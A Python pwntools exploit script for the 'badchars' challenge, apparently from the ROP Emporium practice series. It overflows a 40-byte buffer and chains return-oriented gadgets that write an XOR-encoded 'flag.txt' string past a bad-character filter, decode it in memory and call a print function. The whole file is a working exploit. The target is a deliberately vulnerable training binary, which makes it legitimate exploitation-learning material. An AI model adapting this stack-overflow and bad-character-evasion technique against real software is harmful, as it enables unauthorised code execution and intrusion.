#!/usr/bin/env python3

from pwn import *

pwn = './badchars'
buffer = 40

io = process(pwn)
io.recvuntil(b'> ')

f = open('input','wb')

BAD_CHARS = b'xga.'

POP_RDI = 0x4006a3
POP_R15 = 0x4006a2
POP_R14_R15 = 0x4006a0
POP_ALL = 0x40069c 
XOR_R15_R14 = 0x400628
RET = 0x4006bc
MOV_R13_R12 = 0x0000000000400634
POINTER = 0x601030
PRINT_FLAG = 0x400510

payload  = b''
payload += p64(POP_ALL)
payload += b'fl\x41\x47\x0et\x58t' #r12
payload += p64(POINTER)			   #r13
payload += p64(0x20)			   #r14
payload += p64(POINTER + 2)		   #r15
payload += p64(MOV_R13_R12)
payload += p64(XOR_R15_R14)
payload += p64(POP_R15)
payload += p64(POINTER + 3)
payload += p64(XOR_R15_R14)
payload += p64(POP_R15)
payload += p64(POINTER + 4)
payload += p64(XOR_R15_R14)
payload += p64(POP_R15)
payload += p64(POINTER + 6)
payload += p64(XOR_R15_R14)
payload += p64(POP_RDI)
payload += p64(POINTER)
payload += p64(PRINT_FLAG)

f.write(b'A'*buffer + payload)
io.sendline(b'A'*buffer + payload)
io.interactive()